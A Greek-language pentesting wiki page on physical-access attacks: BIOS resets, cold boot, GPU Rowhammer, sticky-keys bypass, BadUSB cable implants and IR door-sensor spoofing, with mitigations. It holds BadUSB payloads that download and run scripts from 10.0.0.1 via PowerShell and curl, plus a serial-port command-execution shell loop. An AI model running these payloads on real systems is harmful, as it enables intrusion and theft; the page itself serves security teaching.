## Ανάκτηση κωδικού BIOS και ασφάλεια συστήματος

Οι ρυθμίσεις firmware σε παλαιότερους υπολογιστές μπορούν να επαναφερθούν αποσυνδέοντας την μπαταρία CMOS ή χρησιμοποιώντας ένα τεκμηριωμένο jumper εκκαθάρισης CMOS. Ο απαιτούμενος χρόνος απενεργοποίησης εξαρτάται από τη μητρική πλακέτα, ενώ οι σύγχρονοι κωδικοί ή τα κλειδιά UEFI μπορεί να βρίσκονται σε μη πτητική μνήμη flash, σε ενσωματωμένο ελεγκτή ή σε συσκευή ασφαλείας και, επομένως, να διατηρούνται μετά την αφαίρεση της μπαταρίας. Συμβουλευτείτε το εγχειρίδιο της μητρικής πλακέτας ή του service πριν βραχυκυκλώσετε ακίδες· αυτή η διαδικασία μπορεί επίσης να ακυρώσει μετρήσεις TPM και να ενεργοποιήσει την ανάκτηση κρυπτογράφησης δίσκου.

Σε παλαιότερα συστήματα x86, εργαλεία όπως τα **killCMOS** και **CmosPwd** μπορούν να επιθεωρήσουν ή να τροποποιήσουν ρυθμίσεις που διατηρούνται στη CMOS από ένα εκκινήσιμο περιβάλλον. Το CmosPwd αναγνωρίζει μορφές κωδικών πρόσβασης από ένα τεκμηριωμένο σύνολο παλαιότερων οικογενειών BIOS και μπορεί να δημιουργήσει αντίγραφα ασφαλείας, να επαναφέρει ή να διαγράψει/καταστρέψει την κατάσταση CMOS· οι δημοσιευμένες εκδόσεις του προορίζονται για παλαιότερα περιβάλλοντα DOS/Windows, Linux, FreeBSD και NetBSD.<sup>[[18]](#references)</sup> Αυτά τα βοηθητικά προγράμματα δεν αφαιρούν γενικά κωδικούς πρόσβασης UEFI και απαιτούν επαρκή πρόσβαση στο υλικό/firmware.

Κάποια firmware φορητών υπολογιστών εμφανίζουν έναν κωδικό πρόκλησης ειδικό για τον κατασκευαστή έπειτα από αρκετές αποτυχημένες προσπάθειες εισαγωγής κωδικού. Βάσεις δεδομένων όπως η [bios-pw.org](https://bios-pw.org) μπορούν να υπολογίσουν κωδικούς ανάκτησης για παλαιότερα συστήματα ορισμένων κατασκευαστών και μοντέλων, αλλά πολλά συστήματα εφαρμόζουν κλείδωμα χωρίς κωδικό πρόκλησης από τον οποίο να μπορεί να υπολογιστεί κωδικός. Αντιμετωπίστε κάθε κωδικό που δημιουργείται ως ειδικό για το συγκεκριμένο μοντέλο και αποφύγετε να εξαντλήσετε μετρητές προσπαθειών που δεν μηδενίζονται.

### Ασφάλεια UEFI

Για σύγχρονα συστήματα **UEFI**, το CHIPSEC μπορεί να ελέγξει τις προστασίες των μεταβλητών Secure Boot. Ξεκινήστε με τον έλεγχο που δεν τροποποιεί το σύστημα παρακάτω· η προαιρετική λειτουργία `-a modify` επιχειρεί σκόπιμα να αλλοιώσει μεταβλητές και πρέπει να χρησιμοποιείται μόνο σε ανακτήσιμο σύστημα εργαστηρίου. Το CHIPSEC προειδοποιεί επίσης ότι το προνομιούχο πρόγραμμα οδήγησης και η πρόσβαση χαμηλού επιπέδου στο υλικό δεν είναι κατάλληλα για τερματικά παραγωγής.<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

## Ανάλυση RAM και επιθέσεις Cold Boot

Η DRAM δεν χάνει αμέσως κάθε bit όταν σταματά η ανανέωση. Ο ρυθμός αλλοίωσης διαφέρει σημαντικά ανάλογα με την τεχνολογία της μονάδας και τη θερμοκρασία· η ψύξη μπορεί να διατηρήσει χρήσιμα δεδομένα πολύ περισσότερο από έναν κύκλο απενεργοποίησης και επανενεργοποίησης χωρίς ψύξη. Μια επίθεση cold-boot εκτελεί γρήγορα επανεκκίνηση σε ένα μικρό περιβάλλον απόκτησης δεδομένων ή μεταφέρει μια ψυχόμενη μονάδα, καταγράφει την ακατέργαστη μνήμη και ανασυνθέτει κρυπτογραφικά κλειδιά παρά την αλλοίωση των bit. Ένα βοηθητικό πρόγραμμα αντιγραφής δίσκου δεν είναι αυτομάτως εργαλείο απεικόνισης φυσικής μνήμης, ενώ το Volatility αναλύει ένα αποτύπωμα αντί να το αποκτά· χρησιμοποιήστε ένα κατάλληλο για την πλατφόρμα, επικυρωμένο εργαλείο απόκτησης.<sup>[[12]](#references)</sup>

## GPU Rowhammer εναντίον πινάκων σελίδων

Οι σύγχρονες επιθέσεις GPU Rowhammer γίνονται πολύ πιο χρήσιμες όταν στοχεύουν **μεταδεδομένα εικονικής μνήμης GPU** αντί για συνηθισμένα buffers. Πρόσφατη έρευνα σε **GPU NVIDIA Ampere με GDDR6** δείχνει ότι ένας επιτιθέμενος που εκτελεί μη προνομιούχο κώδικα CUDA μπορεί να δημιουργήσει μοτίβα hammering ειδικά για GPU, να χρησιμοποιήσει **memory massaging** για να τοποθετήσει δομές σελιδοποίησης σε ευάλωτες σειρές και στη συνέχεια να αναστρέψει bit στον **πίνακα σελίδων τελευταίου επιπέδου** ή σε έναν ενδιάμεσο **κατάλογο σελίδων**. Μόλις αλλοιωθεί μία εγγραφή μετάφρασης, ο επιτιθέμενος μπορεί να αποκτήσει **αυθαίρετη ανάγνωση/εγγραφή μνήμης GPU** και στη συνέχεια να περάσει στην παραβίαση του host.<sup>[[1]](#references)[[2]](#references)</sup>

### Μοτίβο εκμετάλλευσης

1. **Καταγράψτε τις σειρές που επιδέχονται hammering** στη GDDR6 και δημιουργήστε μοτίβα hammering που λαμβάνουν υπόψη την ανανέωση / είναι μη ομοιόμορφα, ώστε να παρακάμπτουν τους μετριασμούς εντός DRAM.
2. **Χειραγωγήστε τις εκχωρήσεις GPU** ώστε ο driver να τοποθετήσει τις δομές μετάφρασης σελίδων σε φυσικές θέσεις που επιδέχονται hammering, αντί να τις διατηρεί στην προεπιλεγμένη προστατευμένη δεξαμενή. Στην πράξη, αυτό μπορεί να σημαίνει εξάντληση της περιοχής πινάκων σελίδων χαμηλής μνήμης και μαζική δημιουργία μεγάλων αραιών αντιστοιχίσεων UVM με ελεγχόμενα βήματα.
3. **Αναστρέψτε bit στα μεταδεδομένα μετάφρασης**, όπως bit **PFN** ή bit σχετικά με το aperture μέσα σε μια εγγραφή πίνακα σελίδων / καταλόγου σελίδων, ώστε η εικονική σελίδα που ελέγχει ο επιτιθέμενος να αντιστοιχεί σε σελίδες πινάκων σελίδων, αυθαίρετη μνήμη GPU ή αντιστοιχίσεις συστήματος ορατές από τον host.
4. Επαναχρησιμοποιήστε την πλαστογραφημένη αντιστοίχιση για να ξαναγράψετε πρόσθετες εγγραφές μετάφρασης και να κλιμακώσετε την επίθεση σε **αυθαίρετη ανάγνωση/εγγραφή μνήμης GPU** μεταξύ περιβαλλόντων GPU.

### Μετάβαση στον host και μετριασμοί

- Με **απενεργοποιημένο IOMMU**, πλαστογραφημένες αντιστοιχίσεις system-aperture μπορούν να εκθέσουν αυθαίρετη **φυσική μνήμη host** στην GPU, μετατρέποντας την primitive της GPU σε πλήρη παραβίαση του host.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- Το **GDDRHammer** στοχεύει εγγραφές πινάκων σελίδων τελευταίου επιπέδου, ενώ το **GeForge** δείχνει ότι η αλλοίωση ενός επιπέδου καταλόγου σελίδων μπορεί να είναι ευκολότερη, επειδή ένα bit που αναστρέφεται μπορεί να ανακατευθύνει ένα μεγαλύτερο υποδέντρο μετάφρασης. Μην θεωρείτε κρίσιμο για την ασφάλεια μόνο ένα επίπεδο σελιδοποίησης.<sup>[[1]](#references)[[2]](#references)</sup>
- Το **IOMMU** εξακολουθεί να έχει σημασία, επειδή αποκλείει την άμεση διαδρομή αυθαίρετης πρόσβασης στη μνήμη του host που χρησιμοποιούν τα GDDRHammer/GeForge, αλλά **δεν αποτελεί πλήρη μετριασμό**. Το **GPUBreach** παρουσιάζει μια μετάβαση δεύτερου σταδίου, όπου ο επιτιθέμενος αλλοιώνει buffers CPU που είναι εγγράψιμα από την GPU και ανήκουν στον driver και, στη συνέχεια, ενεργοποιεί σφάλματα ασφάλειας μνήμης του driver NVIDIA για να αποκτήσει primitive εγγραφής στον kernel και ένα **root shell**, ακόμη και με ενεργοποιημένο IOMMU.<sup>[[3]](#references)</sup>
- Το **ECC σε επίπεδο συστήματος** είναι ένα πρακτικό μέτρο ενίσχυσης της ασφάλειας σε υποστηριζόμενες GPU workstation/server. Οι καταναλωτικές GPU χωρίς ECC έχουν ασθενέστερη επιφάνεια άμυνας.<sup>[[4]](#references)</sup>
- Αυτές οι επιθέσεις δεν είναι καθαρά θεωρητικές: το **GeForge** ανέφερε **1,171** αναστροφές bit σε RTX 3060 και **202** σε RTX A6000, αριθμός επαρκής για τη δημιουργία μιας λειτουργικής αλυσίδας κλιμάκωσης προνομίων στον host.<sup>[[2]](#references)[[9]](#references)</sup>

## Επιθέσεις Άμεσης Πρόσβασης στη Μνήμη (DMA)

Για offline επιδιόρθωση UEFI IFR/NVRAM που μπορεί να υποβαθμίσει την επιβολή IOMMU πριν από την εκκίνηση και να ενεργοποιήσει μια αλυσίδα DMA σε Windows, δείτε:

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

Το **Inception** επιδεικνύει **απόκτηση και επιδιόρθωση μνήμης μέσω DMA** από διεπαφές όπως FireWire και πρώιμες διαμορφώσεις Thunderbolt, περιλαμβάνοντας ιστορικές υπογραφές παράκαμψης σύνδεσης. Δεν είναι απλώς «αναποτελεσματικό απέναντι στα Windows 10»: η δυνατότητα εκμετάλλευσης εξαρτάται από τη διεπαφή, την έκδοση-στόχο, την πολιτική IOMMU, την κατάσταση κλειδώματος και το αν υποστηρίζεται και είναι ενεργοποιημένο το Windows Kernel DMA Protection. Τα Windows 10 έκδοση 1803 και νεότερα εισήγαγαν το Kernel DMA Protection σε συμβατές πλατφόρμες, αλλάζοντας σημαντικά την επιφάνεια επίθεσης.<sup>[[13]](#references)[[14]](#references)</sup>

## Live CD/USB για πρόσβαση στο σύστημα

Σε μη κρυπτογραφημένο ή ήδη ξεκλειδωμένο τόμο Windows, ένα offline περιβάλλον μπορεί να αντικαταστήσει binaries προσβασιμότητας όπως τα **sethc.exe** ή **Utilman.exe** με το **cmd.exe**, παρέχοντας γραμμή εντολών SYSTEM όταν εκτελεστεί η αντίστοιχη συντόμευση στην οθόνη σύνδεσης. Εργαλεία όπως το **chntpw** μπορούν να τροποποιήσουν δεδομένα τοπικών λογαριασμών SAM. Αυτές οι μέθοδοι δεν παρακάμπτουν έναν κλειδωμένο τόμο BitLocker και μπορούν να καταστρέψουν διαπιστευτήρια που προστατεύονται με DPAPI/EFS· διατηρήστε εγκληματολογικά αντίγραφα και αντίγραφα ασφαλείας.

Το **Kon-Boot** είναι ένα εμπορικό εργαλείο παράκαμψης ελέγχου ταυτότητας κατά την εκκίνηση, για υποστηριζόμενες διαμορφώσεις Windows/macOS. Η συμβατότητα εξαρτάται από το λειτουργικό σύστημα, τη λειτουργία firmware, το Secure Boot και τη ρύθμιση κρυπτογράφησης δίσκου· δεν αποκρυπτογραφεί έναν κλειδωμένο τόμο BitLocker.<sup>[[10]](#references)</sup>

## Χειρισμός λειτουργιών ασφαλείας των Windows

### Συντομεύσεις εκκίνησης και αποκατάστασης

- Τα **Delete/Supr**, F2, F10 ή κάποιο άλλο πλήκτρο του κατασκευαστή μπορεί να ανοίξει τη ρύθμιση firmware.
- Το **F8** εισέρχεται στις παλαιού τύπου επιλογές σύνθετης εκκίνησης των Windows μόνο σε διαμορφώσεις όπου αυτή η διαδρομή παραμένει ενεργοποιημένη· η πρόσβαση στην αποκατάσταση διαφέρει στις τρέχουσες εκδόσεις.
- Κρατώντας πατημένο το **Shift** μπορεί να κατασταλεί η αυτόματη σύνδεση των Windows σε ορισμένες διαμορφώσεις, αν και οι ρυθμίσεις πολιτικής/registry μπορούν να απενεργοποιήσουν αυτή τη συμπεριφορά.<sup>[[17]](#references)</sup>

### Συσκευές BAD USB

Συσκευές όπως τα **USB Rubber Ducky** και οι πλακέτες Teensy μπορούν να αναγνωριστούν ως έμπιστα πληκτρολόγια HID και να εισαγάγουν προκαθορισμένα πλήκτρα. Το payload αρχικά έχει τα προνόμια και την πρόσβαση στην επιφάνεια εργασίας της συνδεδεμένης συνεδρίας· οι προτροπές UAC, το κλείδωμα οθόνης, η διάταξη πληκτρολογίου, ο χρονισμός και η πολιτική USB των endpoint εξακολουθούν να το περιορίζουν.<sup>[[15]](#references)</sup>

### Volume Shadow Copy

Προνόμια διαχειριστή ή δημιουργίας αντιγράφων ασφαλείας μπορούν να χρησιμοποιηθούν για τη δημιουργία shadow copy ή την αποθήκευση των registry hives, ώστε να αποκτηθούν κλειδωμένα αρχεία όπως τα **SAM** και **SYSTEM**. Πρόκειται για τεχνική συλλογής μετά την παραβίαση, όχι για παράκαμψη προνομίων, και θα πρέπει να συσχετίζεται με συμβάντα `diskshadow`/VSS και εξαγωγής registry hive.

## Τεχνικές εμφύτευσης BadUSB / HID

### Android HID gadget που ενεργοποιείται μέσω NFC

Ένα rooted τηλέφωνο Android μπορεί να γίνει προγραμματιζόμενο πληκτρολόγιο USB μόνο όταν ο USB controller και ο kernel του παρέχουν **υποστήριξη USB gadget/HID**. Σε συμβατές συσκευές, το Kali NetHunter παρέχει προφίλ gadget μέσω του **USB Arsenal**. Μια άλλη επιλογή είναι το [USB Gadget Tool](https://github.com/tejado/android-usb-gadget), το οποίο δημιουργεί λειτουργίες gadget ConfigFS και μπορεί να εκθέτει συσκευές χαρακτήρων πληκτρολογίου/ποντικιού όπως `/dev/hidg0` και `/dev/hidg1`. Το εργαλείο δημιουργεί μόνο το gadget endpoint· μια ξεχωριστή διεργασία πρέπει να γράφει αναφορές HID σε αυτό. Η πρόσβαση root δεν μπορεί να αντισταθμίσει έναν kernel που δεν διαθέτει ConfigFS, υποστήριξη HID gadget ή αξιοποιήσιμο USB Device Controller.<sup>[[19]](#references)[[20]](#references)[[21]](#references)</sup>

Αυτό το endpoint μπορεί να συνδυαστεί με NFC Android ως φυσικό trigger. Η εφαρμογή [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID) διαβάζει το UID μιας ετικέτας, το μετατρέπει στην αναμενόμενη αναπαράστασή του, ελέγχει μια τοπική whitelist και στέλνει μια ρυθμισμένη ακολουθία πλήκτρων τύπου Rubber Ducky όταν βρεθεί αντιστοιχία. Ο συνδεδεμένος host βλέπει συνηθισμένη είσοδο πληκτρολογίου και δεν χρειάζεται λογισμικό NFC.<sup>[[22]](#references)[[24]](#references)</sup>

Επαληθεύστε την αναγνώριση της συσκευής και τη διάταξη πληκτρολογίου σε έναν κενό επεξεργαστή κειμένου πριν χρησιμοποιήσετε συντομεύσεις ή εντολές. Ένα ακίνδυνο payload είναι:<sup>[[24]](#references)</sup>

```text
DELAY 1000
STRING NFC HID test successful
ENTER
```

Σημαντικά όρια εμπιστοσύνης:<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

- Μια **λίστα επιτρεπόμενων UID είναι μέσο αναγνώρισης, όχι αυθεντικοποίησης**. Τα UID είναι δημόσια και ορισμένοι τύποι token ή emulators επιτρέπουν την κλωνοποίηση ή την πλαστοπροσωπία. Ένα αντιγραμμένο UID που βρίσκεται στη λίστα ακολουθεί την ίδια διαδρομή δρομολόγησης με το αρχικό token.
- Το module **NfcScreenOff** του Magisk τροποποιεί την υπηρεσία NFC ώστε να συμπεριφέρεται σαν η οθόνη να είναι ενεργή και ξεκλείδωτη. Αν το τηλέφωνο είναι ήδη συνδεδεμένο σε host, αυτό μπορεί να επιτρέψει σε κάποιον να ενεργοποιήσει το payload χωρίς να ξεκλειδώσει το τηλέφωνο.
- Οι κωδικοί πρόσβασης, τα API tokens και οι εντολές που είναι αποθηκευμένα στο payload είναι ανακτήσιμα μυστικά σε συσκευή με root ή ξεκλείδωτο bootloader. Η πληκτρολόγηση κωδικού πρόσβασης μέσω HID είναι αυτοματοποίηση χρήσης επαναχρησιμοποιήσιμου κωδικού, όχι αυθεντικοποίηση χωρίς κωδικό.
- Η εισαγωγή HID ενεργεί με τα δικαιώματα της ενεργής επιφάνειας εργασίας και εξαρτάται από το focus, τον χρονισμό και τη διάταξη πληκτρολογίου του host. Να απαιτείται πρόσφατη επιβεβαίωση του χρήστη πριν από την εκτέλεση ευαίσθητων ενεργειών, να αποφεύγεται η αποθήκευση προνομιακών μυστικών σε scripts και να χρησιμοποιείται authenticator κρυπτογραφικής πρόκλησης-απόκρισης για πραγματική αυθεντικοποίηση.

### Implants καλωδίων με Wi-Fi

- Implants βασισμένα σε ESP32-S3, όπως το **Evil Crow Cable Wind**, κρύβονται μέσα σε καλώδια USB-A→USB-C ή USB-C↔USB-C, αναγνωρίζονται αποκλειστικά ως πληκτρολόγιο USB και εκθέτουν τη στοίβα C2 μέσω Wi-Fi. Ο χειριστής χρειάζεται μόνο να τροφοδοτήσει το καλώδιο από τον host του θύματος, να δημιουργήσει hotspot με όνομα `Evil Crow Cable Wind` και κωδικό πρόσβασης `123456789` και να μεταβεί στο [http://cable-wind.local/](http://cable-wind.local/) (ή στη διεύθυνση DHCP του) για πρόσβαση στο ενσωματωμένο περιβάλλον HTTP.<sup>[[8]](#references)</sup>
- Το UI του browser παρέχει καρτέλες για *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* και *Config*. Τα αποθηκευμένα payloads επισημαίνονται ανά OS, οι διατάξεις πληκτρολογίου αλλάζουν δυναμικά και οι συμβολοσειρές VID/PID μπορούν να τροποποιηθούν ώστε να μιμούνται γνωστά περιφερειακά.
- Επειδή το C2 βρίσκεται μέσα στο καλώδιο, ένα τηλέφωνο μπορεί να προετοιμάζει payloads, να ενεργοποιεί την εκτέλεσή τους και να διαχειρίζεται τα διαπιστευτήρια Wi-Fi χωρίς να χρησιμοποιεί το δίκτυο του οργανισμού—χρήσιμο σε φυσικές εισβολές μικρής διάρκειας.

### Payloads AutoExec με επίγνωση του OS

- Οι κανόνες AutoExec συνδέουν ένα ή περισσότερα payloads με άμεση εκτέλεση μετά την απαρίθμηση USB. Το implant εκτελεί ελαφριά αναγνώριση OS και επιλέγει το αντίστοιχο script.
- Παράδειγμα ροής εργασιών:
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
  - *macOS/Linux:* `COMMAND SPACE` (Spotlight) ή `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Επειδή η εκτέλεση γίνεται χωρίς επίβλεψη, η απλή αντικατάσταση ενός καλωδίου φόρτισης μπορεί να προσφέρει αρχική πρόσβαση τύπου «plug-and-pwn» στο πλαίσιο του συνδεδεμένου χρήστη.

### Απομακρυσμένο shell μέσω Wi-Fi TCP με αρχικοποίηση μέσω HID

1. **Αρχικοποίηση μέσω keystroke:** Ένα αποθηκευμένο payload ανοίγει μια κονσόλα και επικολλά έναν βρόχο που εκτελεί οτιδήποτε φτάσει στη νέα συσκευή USB serial. Μια ελάχιστη παραλλαγή για Windows είναι:

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **Cable bridge:** Το implant διατηρεί ανοιχτό το κανάλι USB CDC, ενώ το ESP32-S3 εκκινεί ένα TCP client (Python script, Android APK ή εκτελέσιμο desktop) που συνδέεται πίσω στον χειριστή. Οποιαδήποτε bytes πληκτρολογούνται στη συνεδρία TCP προωθούνται στον παραπάνω serial loop, παρέχοντας remote command execution ακόμη και σε hosts χωρίς σύνδεση με δίκτυα. Η έξοδος είναι περιορισμένη, επομένως οι χειριστές συνήθως εκτελούν εντολές στα τυφλά (δημιουργία λογαριασμών, προετοιμασία πρόσθετων εργαλείων κ.λπ.).

### Επιφάνεια HTTP OTA update

- Η τεκμηριωμένη διεπαφή Evil Crow Cable Wind εκθέτει ένα endpoint ενημέρωσης firmware χωρίς authentication στο `/update`:<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- Οι field operators μπορούν να αλλάζουν επιτόπου λειτουργίες (π.χ. να εγκαθιστούν firmware USB Army Knife) κατά τη διάρκεια μιας επιχείρησης, χωρίς να αποσυνδέουν το καλώδιο. Έτσι, το implant αποκτά νέες δυνατότητες ενώ παραμένει συνδεδεμένο στον υπολογιστή-στόχο.

## Παράκαμψη της κρυπτογράφησης BitLocker

Μια εξουσιοδοτημένη forensic απόκτηση δεδομένων από ένα σύστημα που λειτουργεί ή λειτουργούσε πρόσφατα ενδέχεται να περιέχει ένα volume master key του BitLocker ή σχετικά κλειδοϋλικά, όσο ο τόμος είναι ξεκλείδωτος. Εμπορικά εργαλεία όπως τα Elcomsoft Forensic Disk Decryptor και Passware Kit Forensic μπορούν να αναζητήσουν σε υποστηριζόμενα memory images, hibernation files ή crash dumps, αλλά η επιτυχία δεν είναι εγγυημένη. Τα σύγχρονα Windows κρυπτογραφούν επίσης τα crash dumps όταν είναι ενεργοποιημένο το BitLocker, ενώ ο αποθηκευμένος κωδικός ανάκτησης 48 ψηφίων είναι διαφορετικό τεχνούργημα από ένα in-memory volume key.<sup>[[12]](#references)[[16]](#references)</sup>

## Κοινωνική μηχανική για την προσθήκη κλειδιού ανάκτησης

Ένας εισβολέας που πείθει έναν διαχειριστή να εκτελέσει εντολές διαχείρισης BitLocker μπορεί να προσθέσει έναν recovery-password, external-key ή άλλο protector και στη συνέχεια να τον υποκλέψει. Ένας recovery password δεν μπορεί να είναι μια αυθαίρετη συμβολοσειρά από μηδενικά: οι αριθμητικοί κωδικοί ανάκτησης του BitLocker έχουν επικυρωμένη μορφή 48 ψηφίων. Η σχετική σύνταξη εξουσιοδοτημένης διαχείρισης είναι `manage-bde -protectors -add C: -recoverypassword`. Εμφανίστε τους protectors που προστέθηκαν με `manage-bde -protectors -get C:`. Παρακολουθείτε τις προσθήκες protectors και βεβαιωθείτε ότι τα νέα δεδομένα ανάκτησης αποθηκεύονται με ασφάλεια μόνο σε εγκεκριμένες τοποθεσίες.<sup>[[16]](#references)</sup>

## Εκμετάλλευση διακοπτών παραβίασης πλαισίου / συντήρησης για επαναφορά του BIOS στις εργοστασιακές ρυθμίσεις

Πολλοί σύγχρονοι φορητοί υπολογιστές και επιτραπέζιοι υπολογιστές μικρού μεγέθους διαθέτουν **διακόπτη παραβίασης πλαισίου**, τον οποίο παρακολουθούν ο Embedded Controller (EC) και το firmware του BIOS/UEFI. Ενώ ο κύριος σκοπός του διακόπτη είναι να ειδοποιεί όταν ανοίγεται μια συσκευή, ορισμένοι κατασκευαστές υλοποιούν μια **μη τεκμηριωμένη συντόμευση ανάκτησης**, η οποία ενεργοποιείται όταν ο διακόπτης αλλάξει κατάσταση με συγκεκριμένο μοτίβο.<sup>[[5]](#references)[[6]](#references)</sup>

### Πώς λειτουργεί η επίθεση

1. Ο διακόπτης συνδέεται σε μια **διακοπή GPIO** του EC.
2. Το firmware που εκτελείται στον EC καταγράφει **τον χρονισμό και τον αριθμό των πατημάτων**.
3. Όταν αναγνωριστεί ένα προκαθορισμένο μοτίβο, ο EC εκτελεί μια ρουτίνα *mainboard-reset*, η οποία **διαγράφει τα περιεχόμενα του system NVRAM/CMOS**.
4. Κατά την επόμενη εκκίνηση, τα επηρεαζόμενα μοντέλα φορτώνουν την επαναφερμένη κατάσταση του firmware. Ανάλογα με τον κατασκευαστή και την έκδοση, η κατάσταση που διαγράφεται μπορεί να περιλαμβάνει κωδικό πρόσβασης supervisor, προσαρμοσμένες ρυθμίσεις εκκίνησης ή καταχωρισμένα κλειδιά Secure Boot· η κατάσταση του TPM και οι επιπτώσεις στην κρυπτογράφηση του δίσκου πρέπει να αξιολογούνται ξεχωριστά.

> Μια επαναφορά firmware μπορεί να επαναφέρει τις επιλογές εξωτερικής εκκίνησης, αλλά **δεν** αποκρυπτογραφεί τον αποθηκευτικό χώρο. Το BitLocker ή κάποιο άλλο σύστημα πλήρους κρυπτογράφησης δίσκου μπορεί να περάσει σε λειτουργία ανάκτησης μετά από αλλαγές στο TPM/firmware και να συνεχίσει να προστατεύει τον εσωτερικό δίσκο, αν δεν υπάρχει κλειδί ανάκτησης.<sup>[[16]](#references)</sup>

### Παράδειγμα από τον πραγματικό κόσμο – φορητός υπολογιστής Framework 13

Η συντόμευση ανάκτησης για το Framework 13 (11ης/12ης/13ης γενιάς) είναι:

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

Μετά τον δέκατο κύκλο, το EC ορίζει μια σημαία που δίνει εντολή στο BIOS να διαγράψει το NVRAM στην επόμενη επανεκκίνηση. Η διαδικασία διαρκεί περίπου 40 δευτερόλεπτα και απαιτεί **μόνο ένα κατσαβίδι**.<sup>[[5]](#references)</sup>

### Γενική διαδικασία εκμετάλλευσης

1. Ενεργοποιήστε ή θέστε σε αναστολή και επαναφέρετε τον στόχο, ώστε να λειτουργεί το EC.
2. Αφαιρέστε το κάτω κάλυμμα για να αποκτήσετε πρόσβαση στον διακόπτη παραβίασης/συντήρησης.
3. Επαναλάβετε το μοτίβο εναλλαγών που ορίζει ο κατασκευαστής (συμβουλευτείτε τεκμηρίωση ή φόρουμ ή κάντε reverse-engineering στο firmware του EC).
4. Επανασυναρμολογήστε τη συσκευή και επανεκκινήστε την. Στη συνέχεια, ελέγξτε ποιες ρυθμίσεις firmware και ποια διαπιστευτήρια άλλαξαν πράγματι.
5. Αν υπάρχει εξουσιοδότηση και είναι διαθέσιμη η εξωτερική εκκίνηση, εκκινήστε από ένα ελεγχόμενο live image. Μόλις ξεκλειδωθεί νόμιμα ένας εσωτερικός τόμος (ή αν δεν ήταν ποτέ κρυπτογραφημένος), το live περιβάλλον μπορεί να αποκτήσει διαπιστευτήρια και δεδομένα ή να επιθεωρήσει το EFI System Partition. Η τροποποίηση αυτού του partition για την εγκατάσταση ενός EFI implant είναι επίμονη και ιδιαίτερα παρεμβατική, ενώ εξακολουθεί να περιορίζεται από το Secure Boot, το measured boot, την προστασία εγγραφής του firmware και την παρακολούθηση endpoint. Ο κρυπτογραφημένος αποθηκευτικός χώρος παραμένει απρόσιτος χωρίς το κλειδί ή το υλικό ανάκτησης.

### Ανίχνευση και μετριασμός

* Καταγράφετε τα συμβάντα παραβίασης του πλαισίου στο management console του OS και συσχετίζετέ τα με μη αναμενόμενες επαναφορές του BIOS.
* Χρησιμοποιείτε **σφραγίδες ασφαλείας που αποκαλύπτουν παραβίαση** στις βίδες και στα καλύμματα, ώστε να εντοπίζεται το άνοιγμα.
* Φυλάσσετε τις συσκευές σε **χώρους με ελεγχόμενη φυσική πρόσβαση**· θεωρείτε ότι η φυσική πρόσβαση ισοδυναμεί με πλήρη παραβίαση.
* Όπου είναι διαθέσιμο, απενεργοποιήστε τη λειτουργία «maintenance switch reset» του κατασκευαστή ή απαιτήστε πρόσθετη κρυπτογραφική εξουσιοδότηση για τις επαναφορές NVRAM.

## Κρυφή έγχυση IR εναντίον αισθητήρων εξόδου χωρίς επαφή

### Χαρακτηριστικά αισθητήρα
- Οι κοινοί αισθητήρες «wave-to-exit» συνδυάζουν έναν πομπό LED εγγύς υπερύθρων με έναν δέκτη τύπου τηλεχειριστηρίου τηλεόρασης, ο οποίος δίνει λογικό high μόνο αφού ανιχνεύσει πολλαπλούς παλμούς (~4–10) του σωστού φέροντος κύματος (≈30 kHz).<sup>[[7]](#references)</sup>
- Ένα πλαστικό κάλυμμα εμποδίζει τον πομπό και τον δέκτη να έχουν άμεση οπτική επαφή, οπότε ο ελεγκτής θεωρεί ότι κάθε έγκυρο φέρον κύμα προέρχεται από κοντινή ανάκλαση και ενεργοποιεί ένα relay που ανοίγει την ηλεκτρική κλειδαριά της πόρτας.
- Μόλις ο ελεγκτής θεωρήσει ότι υπάρχει στόχος, συχνά αλλάζει το περίβλημα διαμόρφωσης της εκπομπής, αλλά ο δέκτης εξακολουθεί να δέχεται κάθε παλμό που ταιριάζει στο φιλτραρισμένο φέρον κύμα.

### Ροή επίθεσης
1. **Καταγράψτε το προφίλ εκπομπής** – συνδέστε έναν logic analyser στους ακροδέκτες του ελεγκτή για να καταγράψετε τόσο τις κυματομορφές πριν από τον εντοπισμό όσο και εκείνες μετά τον εντοπισμό, οι οποίες οδηγούν το εσωτερικό IR LED.
2. **Επαναλάβετε μόνο την κυματομορφή «μετά τον εντοπισμό»** – αφαιρέστε ή αγνοήστε τον εργοστασιακό πομπό και οδηγήστε ένα εξωτερικό IR LED με το μοτίβο που ενεργοποιείται μετά τον εντοπισμό, από την αρχή. Επειδή ο δέκτης ελέγχει μόνο τον αριθμό και τη συχνότητα των παλμών, θεωρεί το πλαστογραφημένο φέρον κύμα γνήσια ανάκλαση και ενεργοποιεί τη γραμμή του relay.
3. **Ελέγξτε τη μετάδοση** – εκπέμπετε το φέρον κύμα σε κατάλληλα ρυθμισμένους παλμούς (π.χ. δεκάδες χιλιοστά του δευτερολέπτου ενεργό και αντίστοιχο διάστημα ανενεργό), ώστε να μεταδοθεί ο ελάχιστος απαιτούμενος αριθμός παλμών χωρίς να κορεστεί το AGC του δέκτη ή η λογική διαχείρισης παρεμβολών. Η συνεχής εκπομπή αποευαισθητοποιεί γρήγορα τον αισθητήρα και εμποδίζει την ενεργοποίηση του relay.

### Έγχυση μέσω ανάκλασης μεγάλης εμβέλειας
- Η αντικατάσταση του LED πάγκου με μια ισχυρή δίοδο IR, έναν driver MOSFET και οπτικά εστίασης επιτρέπει αξιόπιστη ενεργοποίηση από απόσταση ~6 m.
